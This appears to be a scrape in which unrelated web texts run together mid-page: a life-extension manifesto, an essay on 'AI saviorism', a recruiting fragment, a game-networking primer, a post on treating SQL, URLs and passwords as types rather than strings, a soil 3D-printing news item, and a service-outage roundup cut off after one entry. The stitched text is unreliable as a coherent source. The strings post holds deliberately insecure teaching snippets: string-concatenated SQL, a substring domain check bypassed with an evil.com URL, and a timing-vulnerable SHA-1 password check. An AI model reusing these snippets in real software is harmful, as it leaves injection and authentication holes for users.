                        <p>If the proximate purpose of technology is to reduce scarcity, the ultimate purpose of technology is to eliminate mortality.</p><p>At first that sounds crazy. But let's start with the premise: is the proximate purpose of technology to reduce scarcity? Think about how a breakthrough is described: faster, smaller, cheaper, better. All of these words mean that with this new technology, one can do <em>more with less</em>. In the digital world, Google made information on any topic free to anyone with an Internet connection, and WhatsApp made it free to communicate with the same. In the physical world, innovations like the <a href="https://en.wikipedia.org/wiki/Haber_process">Haber Process</a> or the <a href="https://en.wikipedia.org/wiki/Norman_Borlaug#Expansion_to_South_Asia:_the_Green_Revolution">Green Revolution</a> allowed us to produce more with less. In a real sense, these technologies <em>reduced scarcity</em>.</p><p>Now for second half of the sentence, the logical implication. Is the ultimate purpose of technology to eliminate mortality? Well, mortality is the main source of scarcity. If we had infinite time, we would be less concerned with whether something was faster. The reason speed has value is because time has value; the reason time has value is because human life has value, and lifespans are finite. If you made lifespans much longer, you'd reduce the effective cost of <em>everything</em>. Thus insofar as reducing scarcity is acknowledged to be the proximate purpose of technology, eliminating the main source of scarcity – namely mortality – is the ultimate purpose of technology. <strong>Life extension is the most important thing we can invent.</strong></p><p>And it's actually feasible today. It's been shown that we can extend healthy lifespans in mammals – and even <em>reverse</em> aging to bring people back to youth.

</figure><p>You probably weren't aware of this, though. You probably also weren't aware of how far we've come on <a href="https://www.nature.com/articles/d41586-020-00339-3">gene therapy</a>, how much has been done in <a href="https://www.the-scientist.com/news-opinion/rna-injection-restores-hearing-in-guinea-pigs-30855">regenerative medicine</a>, how advanced the latest <a href="https://www.nature.com/articles/s41586-020-2285-x">bionic eyes</a> are – or how <a href="https://twitter.com/balajis/status/1228447944287932416">deadly</a> COVID-19 was as a threat until March of 2020.</p><h2 id="a-duty-to-evangelize-technological-progress">A duty to evangelize technological progress</h2><p>That is because people with scientific and technical backgrounds have not taken it upon ourselves to write about technological progress <em>as a duty</em>. We need to take time out of our busy days to make the case, repeatedly and with high production values, that technological progress is the <em>most </em>important thing we can do for broad-based prosperity and economic growth, and for life itself.</p><p>That starts with testing, drugs, treatments, and vaccines for COVID-19. But it goes far beyond that. Put another way: we may not get life extension or the whole suite of transhumanist technologies (brain-machine interfaces, stem cells, CRISPR gene therapy, and more) unless you, personally, evangelize them online. Not just tweets, but articles. Not just articles, but videos. Not just videos, but feature films. And not just a few films, but an <a href="https://www.whats-on-netflix.com/news/how-long-would-it-take-to-watch-all-of-netflix/">entire Netflix original library's worth</a>, a parallel tech media ecosystem full of inspirational content for technological progressives. A lifetime's worth of content that makes the case for immutable money, infinite frontier, artificial intelligence, and eternal life.</p><p>This may mean less focus on the businesses and personalities of technology. After all, do we care whether the technology for reversing aging is developed by a startup, an academic lab, a scientific consortium, or a solitary biohacker in their garage? No. What we care about is the goal of transcendence. If the technology ends up being <a href="https://www.amazon.com/Patenting-Sun-Polio-Salk-Vacine/dp/0688094945">completely free</a> and open source, so much the better. A corporate vehicle is just one means to an end, not an end in itself. We may need to understand every detail of operating a business, but we can't get lost in those details.</p><p>The point of doing a startup after all is to build something you can't buy. Money can't yet buy you a trip to <a href="https://www.spacex.com/human-spaceflight/mars/">Mars</a>. Or a <a href="https://www.neuralink.com/">neural implant</a>. Or a <a href="https://tricorder.xprize.org/prizes/tricorder">medical tricorder</a>. And at one point in the not-too-distant past it could not buy you a web browser, a search engine, or a smartphone. When the iPhone did not exist, people had to invent it. And they needed to be inspired to invent it.</p><figure><blockquote data-width="550"><div lang="en" dir="ltr"><p>for iphone 1:</p><p>the original mac,<br>blade runner,<br>2001: a space odyssey,<br>sony walkman TPS-L2, <br>braun ET66, <br>the concorde, <br>massimo vignale, <br>henry dreyfuss, <br>apollo 11, <br>the beatles,<br>warp records,<br>NASA,<br>polaroid,<br>arthur c. clarke,<br>eero saarinen</p><p>among others… <a href="https://t.co/F3ayC03T3y">https://t.co/F3ayC03T3y</a></p></div>— Imran Chaudhri (@imranchaudhri) <a href="https://twitter.com/imranchaudhri/status/1092194839540584449?ref_src=twsrc%5Etfw">February 3, 2019</a></blockquote>

</figure><h2 id="a-sense-of-purpose">A sense of purpose</h2><p>Why doesn't inspirational content for technological progressives exist in abundance? Part of the reason is adverse selection. While science fiction – even dystopian science fiction – can inspire, the scientists, engineers, founders, and funders thus inspired are often more occupied with building technology than evangelizing it. But this in turn means that we aren't directly educating the next generation, or the public at large.</p><p>We need to change that. Specifically, people who know math and science, who have experience in managing and investing, who are <em>technological progressives</em> rather than technological conservatives – these people need to learn to write, report, publish, and direct. We need to consciously build a parallel tech-driven decentralized media ecosystem, and we need it to become the first point of call for anyone seeking to learn about technology.</p><p>In this we will have allies around the world. Only the very richest people can afford to be cynical about the merits of technological progress. The <a href="https://www.ben-evans.com/benedictevans/2019/5/28/the-end-of-mobile">billions</a> of people who just got their first smartphone have had their lives dramatically improved as a consequence, and are too pragmatic to romanticize the past. If you haven't already internalized this point, take two minutes to watch <a href="https://www.youtube.com/watch?v=QpvEWVVnICE">this</a>.</p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/QpvEWVVnICE?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>Back? OK. So, building a media ecosystem for technological progressives clearly starts with technical education. At the K-12 level, we've already got plenty of learning apps, and the next step is remote schools. And at the level of collegiate education and continuous learning, Lambda School, Fast.ai, Coursera, Udacity, Udemy, Binance Academy, and the countless GitHub tutorials are an amazing start. But our duty extends beyond education to media of all kinds, particularly visual media.</p><p>The tech ecosystem has natural advantages here. We have the domain knowledge. And the experts at hand. We're already doing content marketing, podcasts, conferences, and a tweetstorm or two. We understand search engines, social networks, and distribution. And yes, we have learned to code.</p><p>What we haven't done yet is <em>full stack narrative</em>. That is, with a <a href="https://wistia.com/series/one-ten-one-hundred">few exceptions</a>, like Elon Musk, we haven't really told story arcs with technological progress at the center. We haven't taken the pitch we use to recruit engineers and externalized it for the public. We haven't infused <a href="https://twitter.com/balajis/status/1276010131990261761">emotion</a> and meaning into our public communications. We haven't made every one of our companies a media company. We haven't set out to tell our story ourselves.</p><p>We need to correct that immediately, and start evangelizing technological progress with every word and action. To recognize that the purpose of technology is to transcend our limits, and to motivate everything we're doing with a sense of that purpose. To take the winnings from our web apps and <a href="https://www.quora.com/How-did-Elon-Musk-fund-his-businesses-from-PayPal-to-SpaceX-and-Tesla">put them towards Mars</a>, to feel no hesitation towards starting small and no shame in dreaming big, to tell the world that it actually is possible to <a href="https://www.the-scientist.com/news-opinion/rna-injection-restores-hearing-in-guinea-pigs-30855">cure the deaf</a>, <a href="https://www.nature.com/articles/s41586-020-2285-x">restore sight</a>, and <a href="http://med.stanford.edu/news/all-news/2020/03/old-human-cells-rejuvenated-with-stem-cell-technology.html">end</a> <a href="https://www.youtube.com/watch?v=9nXop2lLDa4">death</a> <a href="https://www.ldeming.com/longevityfaq">itself</a>.</p>

August 21, 2020 | https://www.shreya-shankar.com/ai-saviorism/ | <a href="https://web.archive.org/web/*/https://www.shreya-shankar.com/ai-saviorism/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I’m uneasy about the <em>saviorism</em> I see becoming more common in applied machine learning. The concept of “saviorism” dates back at least as far as Rudyard Kipling’s poem <a href="https://en.wikipedia.org/wiki/The_White_Man%27s_Burden">“The White Man’s Burden.”</a> In this poem, Kipling refers to 19th century imperialist “moral obligations” of white people to encourage people of color’s economic and social progress through colonialism. Some have discussed <a href="https://www.wired.com/story/tech-needs-to-listen-to-actual-researchers/">tech saviorism</a>, a modern-day manifestation of this phenomenon within the Silicon Valley bubble, and this problem has only been exacerbated by the explosive growth of the modern artificial intelligence and machine learning ecosystem. I’ve noticed that many people in the artificial intelligence and machine learning circles act as “AI Saviors,” believing that, when equipped with copious amounts of data and basic knowledge of artificial intelligence techniques, they can quickly solve open problems in unrelated fields.</p>
<p><strong>Machine learning is a tool to help build solutions, not the entire solution.</strong> Unfortunately, I hear about so many startups, ML<sup id="fnref-1"><a href="#fn-1">1</a></sup>  practitioners, VCs, and researchers that have forgotten the second part. In light of this worrying trend, I want to:</p>
<ul>
<li>Discuss examples of the AI Savior mentality and how this leads to failure. </li>
<li>Speak openly about my own mistaken use of the saviorism attitude to illustrate my points. </li>
<li>Avoid linking to specific current projects or calling out specific individuals for exhibiting AI Saviorism, since my goal is not to put people down — I want to demonstrate why machine learning practitioners must fight the AI Savior mentality in order to be effective problem-solvers. </li>
<li>Take a stab at rescoping the relationship between ML practitioners and domain experts (as an alternative to AI Saviorism) and invite people to add to or refine it.</li>
</ul>
<h2>My experience as an AI Savior</h2>
<p>In my five years at Stanford, I had plenty of access to high-profile AI thought leaders and researchers. I took several incredible machine learning courses, and there were many AI research opportunities open to me and other undergrads. These courses were incredibly popular—there were close to 1,000 students in one of my machine learning classes! </p>
<p>As I took more AI courses, I began to buy into the idea that AI methods could be quick solutions to many problems. Only upon reflection do I realize the small things in these courses probably contributed to the AI Saviorism narrative. For instance, an unfortunate consequence of having hundreds of students in these 10-week-long, project-based courses is that the projects tend to be rushed, poorly supervised, and hacked together at the last minute to boast impressive (and sometimes made-up) results for some arbitrary application of machine learning. The project fairs at the end of every class were extremely elaborate and involved lots of outside money: for example, several industry companies sponsored the project fair in my deep learning for NLP class and even <a href="https://web.stanford.edu/class/archive/cs/cs224n/cs224n.1174/reports.html">gave out prizes for the “best projects.”</a> After these classes, my peers flocked to bootcamps advertised as opportunities to use AI to solve big problems in a variety of fields within the span of one or two quarters. Could AI alone really save the world from health and climate issues in such a short time frame?</p>
<p>By the end of my undergraduate education, I (somewhat misguidedly) strongly believed that <a href="https://www.technologyreview.com/2016/01/12/163910/could-ai-solve-the-worlds-biggest-problems/">AI methods could be the solution to many problems</a>. In my deep learning for genomics class, we read Nature papers about how AI could diagnose illnesses based on x-rays, thus eliminating the need for doctors in the future<sup id="fnref-2"><a href="#fn-2">2</a></sup>. Large tech companies published blog posts describing their efforts to solve daunting medical challenges, climate questions, criminal justice issues, and more<sup id="fnref-2"><a href="#fn-2">2</a></sup>. It felt like every machine learning project went through the beginning stages of a <a href="https://en.wikipedia.org/wiki/Hype_cycle">Gartner hype cycle</a>. I’m ashamed to admit that I bought into the hype, but this issue is much larger than me and warrants greater attention, even if it’s at my expense.</p>
<h2>Losing my AI Saviorism in order to be an effective problem-solver</h2>
<p>Reality hit for me when I started working in industry. When recruiting for full-time roles, I checked all the boxes of a technically competent AI Savior — research experience, strong coding skills, an ability to “think critically” about the technology and acknowledge technical limitations, and a firm belief that non-domain experts could single-handedly revolutionize any industry with AI. The first time we ingested a client’s data, I jumped to coding up baseline models and then convolutional neural networks. Obviously, deep learning would outperform crude heuristics devised by people who couldn’t code, right? Wasn’t that what every applied ML paper boasted?</p>
<p>But my models didn’t work off the bat, and I felt disillusioned. Articles online indicated that I could blame my ML failures on <a href="https://neoteric.eu/blog/ai-projects-fail-heres-why/">data issues</a> — maybe there wasn’t enough data, or the data wasn’t clean. In communicating my ML results with the client, I kept giving excuse after excuse — the data format is inefficient, many rows have missing values, the dataset is only partially labeled, etc. — for why I, the AI Savior, couldn’t quickly deliver a solution. In hindsight, there are so many other barriers to making ML work in production, and at the time <a href="https://workera.ai/resources/machine-learning-engineer/">I thought I was only there to solve the modeling and engineering problems</a>.</p>

<em>This figure (figure 2) depicts skills needed for a machine learning engineer, taken from the <a href="https://workera.ai/resources/machine-learning-engineer/">deeplearning.ai article</a> on what a machine learning engineer does.<sup id="fnref-3"><a href="#fn-3">3</a></sup></em></p>
<p>My frustration only deepened when I realized that our product needed to be a recurring solution, not a one-time solution. I couldn’t save the client with a quick AI patch to all their problems and move on. AI Saviorism was preventing me from being an effective engineer: I needed to stop blaming my failures on lack of data or things “not in my control.” If I were really interested in machine learning to make a positive impact, I needed to figure out what my clients needed, not write more TensorFlow code. </p>
<p>As I’ve learned this past year, it’s pretty naive to assume my clients will have perfectly cleaned data, lightweight infrastructure, and a clear idea of the correct machine learning metric to evaluate. If they had all these things, I wouldn’t have a job! To be an effective problem-solver, I had to realize:</p>
<ol>
<li>For any machine learning project to be successful, you need buy-in from relevant stakeholders. You need to figure out what they want, work with them to frame those goals in ways such that success can be quantified and measured, and help them understand how the models you produce (hopefully) achieve those objectives.</li>
<li>Building machine learning models is only part of the solution, not the entire solution. There are many other technical parts of the machine learning stack: data ingestion, validation, cleaning, training, evaluation, retraining, predicting, serving, and more. You can’t just build a big black AI box and hand it to the stakeholder — you need to figure out how to connect their data to your black box, and connect your black box outputs to a part of their technology stack that they use regularly.</li>
</ol>
<p>I now firmly believe that it is on the ML practitioner to work with the stakeholder to embed their tools into the stakeholder’s stack to enable solutions, not magically promise solutions that work out-of-the-box. Over time, my AI Savior complex crumbled as I began to clean the data myself, listen to domain experts on how one would solve the problem without ML, spend (sometimes too many) hours in meetings, empathize with the clients, and humbly accept that users don’t care deeply about machine learning like I do — they just care that the product works.</p>
<h2>Other examples and implications of AI Saviorism</h2>
<p>I think it’s hard to talk about many examples of AI Saviorism without hurting egos or feelings. However, one pedagogical, seemingly non-controversial example of AI Saviorism and its failure is the <a href="https://www.wired.com/2015/10/can-learn-epic-failure-google-flu-trends/">Google Flu Trends project</a>. A group of engineers and researchers devised a way to forecast flu prevalence based on Google searches, but its forecasts at the peak of the 2013 flu season were off by 140 percent. <a href="https://gking.harvard.edu/files/gking/files/0314policyforumff.pdf">An interesting follow-up critique</a> implied that the failure was a result of correlated, but not causal variables. The authors commented on the idea of “big data hubris” — “the often implicit assumption that big data are a substitute for, rather than a supplement to, traditional data collection and analysis.” A negative consequence of “big data hubris” is quite unfortunate: with large numbers of more-detailed observations, it’s easier than ever to find semantically or structurally unrelated correlations in data. Just because someone has access to a large amount of data doesn’t mean they can exhibit AI Saviorism and blindly ignore relationships between variables found in “small data” analysis. </p>
<p>Another more recent set of examples of AI Saviorism revolves around the COVID-19 pandemic. This <a href="https://www.wired.com/story/artificial-intelligence-couldnt-save-us-from-covid-19/">WIRED article</a> discusses compelling machine learning ideas, such as a chest CT scan classifier and a viral protein generative model. But the article also implies “lack of data” is a main challenge to making these ideas work. Limited data is <em>a</em> problem, but the underlying problem here is that AI practitioners aren’t focusing on integrating their methods into existing systems designed by domain experts. Our jobs shouldn’t be to pawn off our code on someone else once we’ve gone off and written it alone, but rather to ensure our work is integrated into existing pipelines — which will inevitably involve working with the domain experts to devise better data collection techniques, and more.</p>
<p>Why bother fighting AI Saviorism for reasons other than getting a model to be used by stakeholders? If one tries to hastily build an AI system to solve an open problem in another field, they might prioritize hastily constructing a train/test split and training a bunch of models rather than the <a href="https://christophergs.com/machine%20learning/2019/03/17/how-to-deploy-machine-learning-models/">infrastructure, robust validation techniques, and deployment</a> …</p></div></div>

					<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>&nbsp;And this is where the appeal of a recruiting company comes in.</b> They could probably reach out to 60-80% of the entire talent pool, and I would be willing to bet that they could do it in less than a week. Businesses whose main focus is not recruiting would have a very hard time matching this speed. When a company is looking at limited prospects and a lengthy process, it makes sense for them to outsource to a service that promises to deliver qualified candidates&nbsp;<i>fast</i>.

<h2 id="introduction">Introduction</h2>
<p>This is the first in a series of articles exploring the techniques and algorithms that make fast-paced multiplayer games possible. If you’re familiar with the concepts behind multiplayer games, you can safely skip to the next article – what follows is an introductory discussion.</p>
<p>Developing any kind of game is itself challenging; multiplayer games, however, add a completely new set of problems to be dealt with. Interestingly enough, the core problems are human nature and physics!</p>
<h2 id="the-problem-of-cheating">The problem of cheating</h2>
<p>It all starts with cheating.</p>
<p>As a game developer, you usually don’t care whether a player cheats in your single-player game – his actions don’t affect anyone but him. A cheating player may not experience the game exactly as you planned, but since it’s their game, they have the right to play it in any way they please.</p>
<p>Multiplayer games are different, though. In any competitive game, a cheating player isn’t just making the experience better for himself, he’s also making the experience worse for the other players. As the developer, you probably want to avoid that, since it tends to drive players away from your game.</p>
<p>There are many things that can be done to prevent cheating, but the most important one (and probably the only really meaningful one) is simple :&nbsp;<em>don’t trust the player</em>. Always assume the worst – that players&nbsp;<em>will</em>&nbsp;try to cheat.</p>

<p>This leads to a seemingly simple solution – you make everything in your game happen in a central server under your control, and make the clients just privileged spectators of the game. In other words, your game client sends inputs (key presses, commands) to the server, the server runs the game, and you send the results back to the clients. This is usually called using an&nbsp;<em>authoritative server</em>, because the one and only authority regarding everything that happens in the world is the server.</p>
<p>Of course, your server can be exploited for vulnerabilities, but that’s out of the scope of this series of articles. Using an authoritative server does prevent a wide range of hacks, though. For example, you don’t trust the client with the health of the player; a hacked client can modify its local copy of that value and tell the player it has 10000% health, but the server <em>knows</em> it only has 10% – when the player is attacked it will die, regardless of what a hacked client may think.</p>
<p>You also don’t trust the player with its position in the world. If you did, a hacked client would tell the server “<strong>I’m at (10,10)</strong>” and a second later “<strong>I’m at (20,10)</strong>”, possibly going through a wall or moving faster than the other players. Instead, the server <em>knows</em> the player is at (10,10), the client tells the server “<strong>I want to move one square to the right</strong>”, the server updates its internal state with the new player position at (11,10), and then replies to the player “<strong>You’re at (11, 10)</strong>”:</p>
<figure>
<img src="https://gabrielgambetta.com/img/fpm1-01.png" alt="A simple client-server interaction."><figcaption>A simple client-server interaction.</figcaption>
</figure>
<p>In summary: the game state is managed by the server alone. Clients send their actions to the server. The server updates the game state periodically, and then sends the new game state back to clients, who just render it on the screen.</p>
<h2 id="dealing-with-networks">Dealing with networks</h2>
<p>The dumb client scheme works fine for slow turn based games, for example strategy games or poker. It would also work in a LAN setting, where communications are, for all practical purposes, instantaneous. But this breaks down when used for a fast-paced game over a network such as the internet.</p>
<p>Let’s talk physics. Suppose you’re in San Francisco, connected to a server in the NY. That’s approximately 4,000 km, or 2,500 miles (that’s roughly the distance between Lisbon and Moscow). Nothing can travel faster than light, not even bytes on the Internet (which at the lower level are pulses of light, electrons in a cable, or electromagnetic waves). Light travels at approximately 300,000 km/s, so it takes 13 ms to travel 4,000 km.</p>
<p>This may sound quite fast, but it’s actually a very optimistic setup – it assumes data travels at the speed of light in a straight path, with is most likely not the case. In real life, data goes through a series of jumps (called&nbsp;<em>hops</em> in networking terminology) from router to router, most of which aren’t done at lightspeed; routers themselve introduce a bit of delay, since packets must be copied, inspected, and rerouted.</p>
<p>For the sake of the argument, let’s assume data takes 50 ms from client to server. This is close to a best-case scenario – what happens if you’re in NY connected to a server in Tokyo? What if there’s network congestion for some reason? Delays of 100, 200, even 500 ms are not unheard of.</p>
<p>Back to our example, your client sends some input to the server (“<strong>I pressed the right arrow</strong>”). The server gets it 50 ms later. Let’s say the server processes the request and sends back the updated state immediately. Your client gets the new game state (“<strong>You’re now at (1, 0)</strong>”) 50 ms later.</p>
<p>From your point of view, what happened is that you pressed the right arrow but nothing happened for a tenth of a second; then your character finally moved one square to the right. This perceived&nbsp;<em>lag</em>&nbsp;between your inputs and its consequences may not sound like much, but it’s noticeable – and of course, a lag of half a second isn’t just noticeable, it actually makes the game unplayable.</p>
<h2 id="summary">Summary</h2>
<p>Networked multiplayer games are incredibly fun, but introduce a whole new class of challenges. The authoritative server architecture is pretty good at stopping most cheats, but a straightforward implementation may make games quite unresponsive to the player.</p>
<p>In the following articles, we’ll explore how can we build a system based on an authoritative server, while minimizing the delay experienced by the players, to the point of making it almost indistinguishable from local or single player games.</p>

  <p>As programmers, we have a collective delusion that anything that can be represented as a string, is a string. This thinking causes a whole bunch of problems.</p>

<p>Let’s take SQL for example. Every API in every programming language that I’ve seen considers SQL statement a string.</p>

<div><div><pre><code>function execute(sql: string): Promise&lt;Result&gt;
</code></pre></div></div>

<p>The problem with this API is that not every string is a valid SQL (nor sometimes it is the SQL you actually want to run).</p>

<p>Here’s a classic example of the misuse:</p>

<div><div><pre><code>const query = 'SELECT * FROM posts WHERE id = '
  + params.id;
</code></pre></div></div>

<p>In this example <code>params.id</code> can be anything, including invalid or malicious SQL.</p>

<p>The root problem here is not the lack of sanitization. The problem is that SQL is treated as a string.</p>

<p>Think about JSON for another example. You could certainly implement adding an item to a hash by doing this (I hope this code makes you cringe):</p>

<div><div><pre><code>function addKeyValue(json, key, value) {
  return json.substr(0, json.length - 1)
    + ', "' + key + '": "' + value + '"}';
}
</code></pre></div></div>

<p>As with the SQL example, you could add escaping and sanitization, but it’s just hacks hiding the real problem:</p>

<p><em>A string can be a representation of a thing, but it’s not the thing itself.</em></p>

<p>And it’s not only about concatenating strings. Can you spot the problem with this function? <span onclick="event.target.innerText = 'This URL will be marked as safe by the code below https://evil.com/https://safe.com/'">(see answer)</span></p>

<div><div><pre><code>function isSafeDomain(url: string): boolean {
  return url.includes('https://safe.com/');
}
</code></pre></div></div>

<p>Or in this one? <span onclick="event.target.innerText = 'This code is prone to timing attacks'">(see answer)</span></p>

<div><div><pre><code>function checkPassword(pass: string, hash: string): boolean {
  return sha1(pass) === hash;
}
</code></pre></div></div>

<p>Strings are lower level, and thus are much more flexible than they need to be to properly implement valid operations on the higher level concepts.</p>

<p>Incomplete list of things that are not strings:</p>

<ul>
  <li>SQL</li>
  <li>HTML</li>
  <li>JSON</li>
  <li>URL</li>
  <li>File path</li>
  <li>Password</li>
</ul>

<h2 id="things-are-things">Things are… things</h2>

<p>You can save yourself a lot of headache if you stop treating everything that can be represented as a string, as a string.</p>

<p>Both OO and FP styles allow for abstracting away something as a type or a class. You can make a closed opaque structure for the thing and limit the ways it can be constructed.</p>

<p>For example, for SQL, you might want to make sure it’s only created from static string literals.</p>

<div><div><pre><code>// Allowed
new SQL('SELECT * FROM posts WHERE id = ?');

// No allowed (e.g. via a lint rule)
new SQL('SELECT * FROM posts' + filter);
</code></pre></div></div>

<p>Of course, at some point, you will need to serialize the thing into a string to pass it into an API that was designed to consume a string. Do it at the last possible moment and try to limit it to a single place in the codebase.</p>

<div><div><pre><code>function execute(sql: SQL): Promise&lt;Result&gt; {
  return unsafeExecute(sql.toString());
}
</code></pre></div></div>

<p>Strings are coming into your app from the outer world. Don’t trust them to be what they seem they are. Convert them into proper things as soon as possible, and convert them back to strings as late as possible.</p>

<p>Here’s a few libraries for inspiration of how to treat things as… things:</p>

<ul>
  <li>SQL: <a href="https://github.com/gajus/slonik">Slonik</a>, <a href="https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/linq/basic-linq-query-operations">LINQ</a></li>
  <li>HTML: React, Elm, <a href="https://github.com/tonsky/rum">rum</a></li>
  <li>JSON: a dictionary in any programming language</li>
  <li>URL: <a href="https://docs.rs/url/2.1.1/url/">url - Rust</a></li>
  <li>File paths: <a href="https://doc.rust-lang.org/std/path/struct.Path.html">std::path::Path - Rust</a></li>
  <li>Passwords: <a href="https://github.com/myfreeweb/secstr">secstr</a>, <a href="https://hackage.haskell.org/package/securemem">securemem</a></li>

While concrete is the material of choice for many construction projects, it has a large carbon footprint, resulting in high waste and energy expenditure. , researchers report progress toward a sustainable building material made from local soil, using a 3D printer to create a load-bearing structure.</p><p>The researchers presented their results today at the American Chemical Society (ACS) Fall 2020 Virtual Meeting &amp; Expo. ACS held the meeting through Thursday. It featured more than 6,000 presentations on a wide range of science topics.</p><p>“The environmental impact of the construction industry is an issue of growing concern,” says Sarbajit Banerjee, Ph.D., the project’s principal investigator. “Some researchers have turned to additive manufacturing, or building structures layer by layer, which is often done with a 3D printer. That advance has begun to transform this sector in terms of reducing waste, but the materials used in the process need to be sustainable as well.”</p><p>For example, construction projects using extruded layers of concrete have highlighted the potential of additive manufacturing for building structures quickly and cheaply. However, concrete manufacturing is responsible for approximately 7% of carbon dioxide emissions according to the International Energy Agency, and cannot be recycled.</p><p>“Historically, humans used to build with locally sourced materials, such as adobe, but the move to concrete has raised many environmental issues,” says Aayushi Bajpayee, a graduate student in Banerjee’s lab at Texas A&amp;M University. She is presenting the work at the meeting. “Our thought was to turn the clock back and find a way to adapt materials from our own backyards as a potential replacement for concrete.”</p><p>An advantage to using local soil in construction is that the materials would not need to be manufactured and transported to the building site, reducing both costs and environmental damage. Banerjee and Bajpayee also say that additive manufacturing with soil could one day be used beyond Earth, to create settlements on the moon or even Mars.</p><p>Soil is typically classified by the layers of materials it comprises, beginning with the top organic layer where plants grow and ending at the hard bedrock of the earth’s crust. Beneath the initial organic layer is clay, which gives soil its plastic, moldable character that the researchers capitalized on in their project.</p><p>The researchers began by collecting soil samples from a colleague’s backyard and tailoring the material with a new environmentally friendly additive so that it would bind together and be easily extruded through the 3D printer. Because soils vary greatly by location, their aim was to have a chemistry “toolkit” that could transform any type of soil into printable building material. From there Bajpayee built small-scale test structures, cubes measuring two inches on each side, to see how the material performed when extruded into stacked layers.</p><figure data-orig-width="720" data-orig-height="862"><img src="https://64.media.tumblr.com/55d595d3f207db7dc19ff800ff843dea/3a3a3d5823a5b6e0-f9/s1280x1920/71f447a5e76e3b559eda901a3aafc344ba278485.jpg" alt="image" data-orig-width="720" data-orig-height="862" width="720" height="862"></figure><p><i>Image:&nbsp;“Scientists have developed a method to 3D print structures using local soil.”.

To help with this, the researchers strengthened the clay mixture by “zippering” the microscopic layers on its surface to prevent it from absorbing water and expanding, which would compromise the printed structure. With this method, the researchers showed that the material could hold twice as much weight as the unmodified clay mixture.</p><p>Next, the team plans to improve the soil’s load-bearing capabilities in order to scale up their test structures and get as close to a replacement for concrete as possible. In addition, they are gathering data to see whether these 3D printed structures are as environmentally friendly as they envision, especially in terms of carbon footprint and recycling potential. Once they have a better picture of the chemistry, functionality and feasibility of building with local soils, they plan to further explore how this technology can be used beyond our own planet.</p><p>–</p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.acs.org%2Fcontent%2Facs%2Fen%2Fpressroom%2Fnewsreleases%2F2020%2Faugust%2F3d-printing-greener-buildings-using-local-soil.html&amp;t=NTllMjUyZjg3ZWE0NTUxYWM0NTJkYjlkZWJiYmM1NTc2NmZjZjU2OCxJS3pwaTBtcQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627087631269888000%2F3d-printing-buildings-with-local-soil&amp;m=0&amp;ts=1598257361">American Chemical Society</a></b></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/620672066180595712/rice-university-4d-printing">Rice University lab makes 4D printing more practical</a></p>

<p>Anything bad that can happen — will happen. This old adage applies 100% to the technology industry, where crashes and outages are far more common than the sales and marketing teams would want us to think. However, DevOps engineers that deal with infrastructure know how hard it is to ensure everything works as intended all of the time — and to configure monitoring that actually keeps track of a system’s health and helps prevent crashes and downtime.&nbsp;</p>

We have mountains of data on downtime and outages and see the full picture, so we decided to make a quarterly top downtime list. We hope our findings will motivate DevOps engineers to see how others deal with service outages so they can improve their own reliability.&nbsp;</p>
<p>Read on to find out about the five biggest outages of Q2 2020 and how Slack, Zoom, GitHub, IBM Cloud and T-Mobile acted during these crises. We also rate the outcomes of these outages and would be glad to hear your thoughts on our ratings.</p>
<h2>Outage #1 – <strong>World-wide Slack outage, May 12, 2020</strong></h2>
<p>Slack is the primary means of communication for thousands of companies worldwide, so its stable uptime is a matter of utmost importance. Thus, when users stopped being able to send and receive Slack messages around 7:30 PM EDT, the situation quickly escalated into a full-scale problem. Unlike during previous outages, this affected the entire Slack ecosystem: nobody could log in to Slack or receive any notifications. “Is Slack down?”, the users asked themselves and the answer was an undeniable “Yes!”</p>

<p>Anyone using the Slack Electron app was getting a generic HTTP error. Even the next day, after the issue had been resolved, people using the Slack app were still seeing the same error message. The app doesn’t refresh automatically so it was confusing for non-technical users, many of whom didn’t know they had to press Ctrl-R to refresh the app and restore service after the error.</p>
<p>The company confirmed they were aware of a situation and posted regular updates to <a href="https://status.slack.com/2020-05/147dad376c8946ff" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" data-wpel-link="external">the Slack status page</a>. Quite importantly, these updates were not standardized ‘we are aware of the situation, please stand by’ responses.</p>
<figure></figure>
<p>Team representatives wrote detailed messages that showed customers the Slack team were transparent about the challenge they faced and the efforts they made to overcome it.</p>
<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">We are seeing performance improvements and you may be able to connect once again. We're working to fully restore service for everyone. Thank you for bearing with us.</p>— Slack (@SlackHQ) <a href="https://twitter.com/SlackHQ/status/1260378685334409216?ref_src=twsrc%5Etfw" data-wpel-link="external" target="_blank" rel="nofollow">May 13, 2020</a></blockquote>
</div></figure>
<p>At 10:26 PM EDT Slack reported full restoration of services and apologized for the inconvenience once again. Even more importantly, they published a detailed <a href="https://slack.engineering/a-terrible-horrible-no-good-very-bad-day-at-slack-dfe05b485f82" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" data-wpel-link="external">postmortem</a> on Medium, explaining the reasons behind the issue, the actions they performed to overcome it, the conclusions they came to, and the measures they were undertaking to eliminate the chance of a similar situation happening again.</p>
<p>Feel free to read this postmortem, it is very technical yet quite understandable even for laypersons. Slack demonstrates here that they care about members of their user base — both developers and the mass user base, and the confidence this article projects is admirable.</p>
<p>An important thing to note here is that while the issue itself started at 8:30 AM EDT, the issue went completely under the radar till around 7:30 PM EDT when multiple users reported issues with Slack. They reported them inside the app (which was mostly down by that time), on Twitter, on Downdetector, on the Slack website (which went down too quite soon) and through many other channels, before the Slack team became aware of the situation.&nbsp;</p>
<p>Getting notified about an outage would have been much faster and easier with StatusGator, where you can aggregate multiple status pages into one dashboard. StatusGator can send centralized notifications on downtimes for any services and APIs, and you can enjoy it with a <a href="https://statusgator.com/plans" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener follow" data-wpel-link="internal">free subscription plan</a>!</p>
<h2>Outage #2 – <strong>Zoom shutdown, May 17, 2020</strong></h2>
